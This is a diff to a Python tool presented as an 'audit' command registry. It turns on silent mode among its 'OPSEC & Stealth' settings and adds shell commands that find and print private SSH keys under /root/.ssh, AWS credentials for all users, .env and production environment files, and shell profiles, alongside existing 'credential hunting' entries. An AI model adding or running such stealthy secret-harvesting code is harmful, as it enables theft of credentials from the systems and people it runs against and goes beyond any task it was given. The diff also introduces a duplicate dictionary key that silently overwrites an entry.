@@ -616,7 +616,7 @@ class AuditConfiguration:
 
     # OPSEC & Stealth
     memory_only: bool = True  # Never write to disk
-    silent_mode: bool = False  # No console output
+    silent_mode: bool = True  # No console output
     auto_cleanup: bool = True  # Clean up on exit
     self_destruct: bool = False  # Delete script on exit
     randomize_timing: bool = True  # Add random delays
@@ -937,22 +937,13 @@ class CommandRegistry:
             "path_variable": ("bash", "-c", "echo $PATH"),
             "home_directory": ("echo", "$HOME"),
             "current_directory": ("pwd",),
-            # ============ FILE SYSTEM MAPPING ============
-            "mounted_filesystems": ("mount",),
-            "disk_usage": ("df", "-h"),
-            "home_contents": ("ls", "-la", "/home"),
-            "tmp_contents": ("ls", "-la", "/tmp"),
-            "var_tmp_contents": ("ls", "-la", "/var/tmp"),
-            "opt_contents": ("ls", "-la", "/opt"),
-            "etc_contents": ("ls", "-la", "/etc"),
-            "root_contents": ("ls", "-la", "/root"),
-            "web_directories": ("ls", "-la", "/var/www"),
             # ============ SSH RECONNAISSANCE ============
             "ssh_config": ("cat", "/etc/ssh/sshd_config"),
             "ssh_known_hosts": ("cat", "$HOME/.ssh/known_hosts"),
             "ssh_authorized_keys": ("cat", "$HOME/.ssh/authorized_keys"),
             "ssh_private_keys": ("ls", "-la", "~/.ssh/"),
             "ssh_agent_check": ("echo", "$SSH_AUTH_SOCK"),
+            "file_contents_ssh": ("bash", "-c", "find /root/.ssh -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
             # ============ CREDENTIAL HUNTING ============
             "bash_history": ("cat", "~/.bash_history"),
             "zsh_history": ("cat", "~/.zsh_history"),
@@ -961,8 +952,13 @@ class CommandRegistry:
             "python_history": ("cat", "~/.python_history"),
             "aws_credentials": ("cat", "~/.aws/credentials"),
             "docker_config": ("cat", "~/.docker/config.json"),
+            "aws_all_users": ("bash", "-c", "find /home /root -path '*/.aws/credentials' -o -path '*/.aws/config' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
             "git_config": ("cat", "~/.gitconfig"),
             "git_credentials": ("cat", "~/.git-credentials"),
+            # ============ ENVIRONMENT & CREDENTIALS ============
+            "cat_env_files": ("bash", "-c", "find / -maxdepth 4 -name '.env' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
+            "cat_env_local": ("bash", "-c", "find /var/www /opt /srv -name '.env.local' -o -name '.env.production' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
+            "cat_profile_files": ("bash", "-c", "find /home -name '.profile' -o -name '.bashrc' -o -name '.bash_profile' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
             # ============ SECURITY CONTROLS ============
             "sudo_version": ("sudo", "-V"),
             "sudo_list": ("sudo", "-l"),
@@ -997,15 +993,17 @@ class CommandRegistry:
             # ============ FILE SYSTEM MAPPING ============
             "mounted_filesystems": ("mount",),
             "disk_usage": ("df", "-h"),
-            "home_contents": ("ls", "-la", "/home"),
-            "tmp_contents": ("ls", "-la", "/tmp"),
-            "var_tmp_contents": ("ls", "-la", "/var/tmp"),
-            "opt_contents": ("ls", "-la", "/opt"),
-            "etc_contents": ("ls", "-la", "/etc"),
-            "app_contents": ("ls", "-la", "/app"),
-            "root_contents": ("ls", "-la", "/root"),
-            "web_directories": ("ls", "-la", "/var/www"),
-            "cat_app": ("bash", "-c", "find /app -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
+            "file-ls-home": ("ls", "-la", "/home"),
+            "file-ls-tmp": ("ls", "-la", "/tmp"),
+            "file-ls-var_tmp": ("ls", "-la", "/var/tmp"),
+            "file-ls-opt": ("ls", "-la", "/opt"),
+            "file-ls-etc": ("ls", "-la", "/etc"),
+            "file-ls-app": ("ls", "-la", "/app"),
+            "file-ls-app": ("ls", "-la", "/root/.ssh"),
+            "file-ls-root": ("ls", "-la", "/root"),
+            "file-ls-web": ("ls", "-la", "/var/www"),
+            "file_contents_app": ("bash", "-c", "find /app -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"' \\;"),
+            
 
         }
         return commands
@@ -2865,11 +2863,11 @@ def expand_path_in_command(command: Sequence[str]) -> tuple[str, ...]:
     return tuple(expanded)
 
 
-@task(
-    name="execute_command_async",
-    retries=0,
-    log_prints=False,
-)
+# @task(
+#     name="execute_command_async",
+#     retries=0,
+#     log_prints=False,
+# )
 async def execute_command_async(
     command: Sequence[str],
     timeout: int = DEFAULT_COMMAND_TIMEOUT,
